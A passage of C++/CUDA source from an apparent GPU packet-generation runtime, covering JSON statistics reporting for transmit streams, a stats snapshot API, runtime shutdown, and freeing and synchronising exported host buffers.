        << "\"quota_stall\":" << (rt_active ? g_persistent_runtime.ctrl->quota_stall : 0u) << ","
        << "\"queue_pressure\":" << (rt_active ? g_persistent_runtime.ctrl->queue_pressure : 0u) << ","
        << "\"queue_probe_span\":" << (rt_active ? g_persistent_runtime.ctrl->queue_probe_span : 0) << ","
        << "\"max_packet_bytes\":" << (rt_active ? g_persistent_runtime.ctrl->max_packet_bytes : kPersistentMaxPacketBytes)
        << ","
        << "\"queue_spread_events\":" << (rt_active ? g_persistent_runtime.ctrl->queue_spread_events : 0u) << ","
        << "\"ring_occupancy_peak\":" << (rt_active ? g_persistent_runtime.ctrl->ring_occupancy_peak : 0u) << ","
        << "\"bridge_drain_batches\":" << (rt_active ? g_persistent_runtime.ctrl->bridge_drain_batches : 0u) << ","
        << "\"bridge_drain_packets\":" << (rt_active ? g_persistent_runtime.ctrl->bridge_drain_packets : 0u) << ","
        << "\"ring_drop_events\":" << (rt_active ? g_persistent_runtime.ctrl->ring_drop_events : 0u) << ","
        << "\"scheduler_fairness_cv_pct\":"
        << (rt_active ? (static_cast<double>(g_persistent_runtime.ctrl->scheduler_fairness_cv_pct_x100) / 100.0) : 0.0)
        << ","
        << "\"throttle_events\":" << (rt_active ? g_persistent_runtime.ctrl->throttle_events : 0u) << ","
        << "\"drain_attempts\":" << (rt_active ? g_persistent_runtime.ctrl->drain_attempts : 0u) << ","
        << "\"native_batch_degrade_events\":"
        << (rt_active ? g_persistent_runtime.ctrl->native_batch_degrade_events : 0u) << ","
        << "\"contract_kernel_poll_events\":"
        << (rt_active ? g_persistent_runtime.ctrl->contract_poll_events : 0u) << ","
        << "\"contract_kernel_poll_epoch_mismatch_events\":"
        << (rt_active ? g_persistent_runtime.ctrl->contract_poll_epoch_mismatch : 0u) << ","
        << "\"contract_kernel_poll_inactive_flow_events\":"
        << (rt_active ? g_persistent_runtime.ctrl->contract_poll_inactive_flow : 0u) << ","
        << "\"contract_kernel_poll_stale_events\":"
        << (rt_active ? g_persistent_runtime.ctrl->contract_poll_stale_events : 0u) << ","
        << "\"compat_fallback_count\":" << g_compat_fallback_count.load(std::memory_order_relaxed) << ","
        << "\"persistent_tx_backend\":\"" << json_escape_string(g_persistent_runtime.tx_bridge.active) << "\","
        << "\"persistent_doca_kernel_direct_tx\":"
        << (g_persistent_runtime.doca_kernel_direct_tx ? 1 : 0) << ","
        << "\"persistent_bridge_threads_active\":" << g_persistent_runtime.bridge_threads.size() << ","
        << "\"persistent_tx_iface\":\"" << json_escape_string(g_persistent_runtime.tx_bridge.iface) << "\","
        << "\"persistent_tx_doca_device\":\"" << json_escape_string(g_persistent_runtime.tx_bridge.doca_device) << "\","
        << "\"persistent_bridge_ipg_ns\":" << g_persistent_runtime.bridge_ipg_ns << ","
        << "\"persistent_tx_bridge_sent\":" << (rt_active ? g_persistent_runtime.ctrl->tx_bridge_sent : 0u) << ","
        << "\"persistent_produced\":" << (rt_active ? g_persistent_runtime.ctrl->produced : 0u) << ","
        << "\"persistent_heartbeat\":" << (rt_active ? g_persistent_runtime.ctrl->heartbeat : 0u) << ","
        << "\"contract_runtime_active\":" << (g_persistent_contract_runtime.initialized ? 1 : 0) << ","
        << "\"contract_shard_count\":" << g_persistent_contract_runtime.shard_count << ","
        << "\"contract_ring_slots_per_shard\":" << g_persistent_contract_runtime.ring_slots_per_shard << ","
        << "\"contract_hot_flow_capacity\":" << g_persistent_contract_runtime.hot_flow_capacity << ","
        << "\"contract_flow_update_published\":" << g_persistent_contract_runtime.publish_count << ","
        << "\"contract_ring_drop_events\":" << g_persistent_contract_runtime.drop_count << ","
        << "\"contract_version_gap_events\":" << g_persistent_contract_runtime.version_gap_count << ","
        << "\"contract_epoch_mismatch_events\":" << g_persistent_contract_runtime.epoch_mismatch_count << ","
        << "\"contract_device_mirror_active\":"
        << (g_persistent_contract_runtime.device_mirror_initialized ? 1 : 0) << ","
        << "\"contract_device_sync_error_events\":" << g_persistent_contract_runtime.device_sync_error_count
        << "}";
    g_stream_stats_json = oss.str();
    return g_stream_stats_json.c_str();
  }
  auto it = g_persistent_streams.find(stream_id);
  if (it == g_persistent_streams.end()) {
    g_stream_stats_json = "{\"error\":\"stream_id_not_found\"}";
    return g_stream_stats_json.c_str();
  }
  g_stream_stats_json = stream_state_to_json(it->second);
  if (g_persistent_runtime.ctrl && it->second.device_slot >= 0 && it->second.device_slot < kPersistentMaxStreams &&
      g_persistent_runtime.streams && g_persistent_runtime.streams_hot_dev) {
    const int slot = it->second.device_slot;
    PersistentStreamHotState hot{};
    if (persistent_stream_copy_slot_to_host(g_persistent_runtime, slot)) {
      const PersistentDeviceStreamState& d = g_persistent_runtime.streams[slot];
      (void)cudaMemcpy(
          &hot,
          g_persistent_runtime.streams_hot_dev + static_cast<size_t>(slot),
          sizeof(hot),
          cudaMemcpyDeviceToHost);
      if (!g_stream_stats_json.empty() && g_stream_stats_json.back() == '}') {
        g_stream_stats_json.pop_back();
        std::ostringstream dbg;
        dbg << ",\"device_active\":" << d.active
            << ",\"device_protocol\":" << d.protocol
            << ",\"device_target_ip\":" << d.target_ip
            << ",\"device_target_port\":" << d.target_port
            << ",\"device_quota_left\":" << d.quota_left
            << ",\"device_tx_base_timestamp_ns\":" << d.tx_base_timestamp_ns
            << ",\"device_tx_ipg_ns\":" << d.tx_ipg_ns
            << ",\"device_weight\":" << d.weight
            << ",\"device_deficit\":" << d.deficit
            << ",\"device_produced\":" << d.produced
            << ",\"hot_active\":" << hot.active
            << ",\"hot_protocol\":" << hot.protocol
            << ",\"hot_target_ip\":" << hot.target_ip
            << ",\"hot_target_port\":" << hot.target_port
            << ",\"hot_queue_affinity\":" << hot.queue_affinity
            << "}";
        g_stream_stats_json += dbg.str();
      }
    }
  }
  return g_stream_stats_json.c_str();
}

extern "C" int samurai_gpu_packet_read_stream_stats_snapshot(
    int64_t stream_id,
    samurai_gpu_packet_stream_stats_snapshot* out_stats) {
  if (!out_stats) {
    return set_c_api_error("out_stats must not be null");
  }
  std::memset(out_stats, 0, sizeof(*out_stats));
  out_stats->stream_id = stream_id;
  out_stats->kernel_mode = g_kernel_mode.load(std::memory_order_relaxed);

  std::lock_guard<std::mutex> g(g_persistent_lock);
  const bool rt_active = (g_persistent_runtime.ctrl != nullptr);
  out_stats->runtime_active = rt_active ? 1 : 0;
  if (rt_active) {
    out_stats->persistent_tx_bridge_sent = g_persistent_runtime.ctrl->tx_bridge_sent;
    out_stats->persistent_produced = g_persistent_runtime.ctrl->produced;
    out_stats->queue_pressure = g_persistent_runtime.ctrl->queue_pressure;
    out_stats->ring_drop_events = g_persistent_runtime.ctrl->ring_drop_events;
    out_stats->scheduler_fairness_cv_pct =
        static_cast<double>(g_persistent_runtime.ctrl->scheduler_fairness_cv_pct_x100) / 100.0;
    out_stats->no_progress_events = g_persistent_runtime.ctrl->no_progress_events;
    out_stats->persistent_runtime_restarts = g_persistent_runtime.ctrl->runtime_restarts;
    out_stats->quota_stall = g_persistent_runtime.ctrl->quota_stall;
    out_stats->bridge_drain_batches = g_persistent_runtime.ctrl->bridge_drain_batches;
    out_stats->bridge_drain_packets = g_persistent_runtime.ctrl->bridge_drain_packets;
    out_stats->ring_occupancy_peak = g_persistent_runtime.ctrl->ring_occupancy_peak;
    out_stats->persistent_bridge_ipg_ns = static_cast<uint64_t>(g_persistent_runtime.bridge_ipg_ns);
    out_stats->max_packet_bytes = static_cast<uint64_t>(g_persistent_runtime.ctrl->max_packet_bytes);
  } else {
    out_stats->persistent_bridge_ipg_ns = static_cast<uint64_t>(g_persistent_runtime.bridge_ipg_ns);
    out_stats->max_packet_bytes = static_cast<uint64_t>(kPersistentMaxPacketBytes);
  }
  out_stats->compat_fallback_count = g_compat_fallback_count.load(std::memory_order_relaxed);

  if (stream_id != 0) {
    auto it = g_persistent_streams.find(stream_id);
    if (it == g_persistent_streams.end()) {
      return set_c_api_error("stream_id not found");
    }
    const auto& st = it->second;
    out_stats->submitted = st.submitted;
    out_stats->completed = st.completed;
    out_stats->quota_left = st.quota_left;
    if (st.device_slot >= 0 && st.device_slot < kPersistentMaxStreams && g_persistent_runtime.streams) {
      (void)persistent_stream_copy_slot_to_host(g_persistent_runtime, st.device_slot);
      const PersistentDeviceStreamState& d = g_persistent_runtime.streams[st.device_slot];
      out_stats->submitted = static_cast<uint64_t>(d.produced);
      out_stats->completed = static_cast<uint64_t>(host_u32_load(&d.completed));
      out_stats->quota_left = static_cast<uint64_t>(d.quota_left);
    }
  }

  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" int samurai_gpu_packet_shutdown_runtime() {
  {
    std::lock_guard<std::mutex> g(g_persistent_lock);
    g_persistent_streams.clear();
  }
  persistent_runtime_release_unlocked();
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" void samurai_gpu_packet_free(void* ptr) {
  if (!ptr) {
    return;
  }
  auto* payload = static_cast<uint8_t*>(ptr);
  auto* header = reinterpret_cast<ExportHostBufferHeader*>(payload) - 1;
  if (header->magic != kExportHostBufferMagic) {
    std::free(ptr);
    return;
  }
  if (header->pending_stream_handle != 0u) {
    cudaStream_t stream = decode_stream_handle(header->pending_stream_handle);
    if (stream) {
      (void)cudaStreamSynchronize(stream);
    } else {
      (void)cudaDeviceSynchronize();
    }
    header->pending_stream_handle = 0u;
  }
  if (header->pending_device_ptr != 0u) {
    auto* dptr = reinterpret_cast<uint8_t*>(static_cast<uintptr_t>(header->pending_device_ptr));
    (void)cudaFree(dptr);
    header->pending_device_ptr = 0u;
  }
  const auto kind = static_cast<ExportHostAllocKind>(header->alloc_kind);
  if (kind == ExportHostAllocKind::kCudaHost) {
    cudaFreeHost(static_cast<void*>(header));
    return;
  }
  std::free(static_cast<void*>(header));
}

extern "C" int samurai_gpu_packet_wait(void* ptr) {
  if (!ptr) {
    return 0;
  }
  auto* payload = static_cast<uint8_t*>(ptr);
  auto* header = reinterpret_cast<ExportHostBufferHeader*>(payload) - 1;
  if (header->magic != kExportHostBufferMagic) {
    return 0;
  }
  if (header->pending_stream_handle == 0u) {
    return 0;
  }
  cudaStream_t stream = decode_stream_handle(header->pending_stream_handle);
  cudaError_t st = stream ? cudaStreamSynchronize(stream) : cudaDeviceSynchronize();
  if (st != cudaSuccess) {
    return set_c_api_error(std::string("samurai_gpu_packet_wait synchronize failed: ") + cudaGetErrorString(st));
  }
  header->pending_stream_handle = 0u;
  return 0;
}

extern "C" const char* samurai_gpu_packet_last_error() {
  return g_samurai_gpu_packet_last_error.c_str();
}
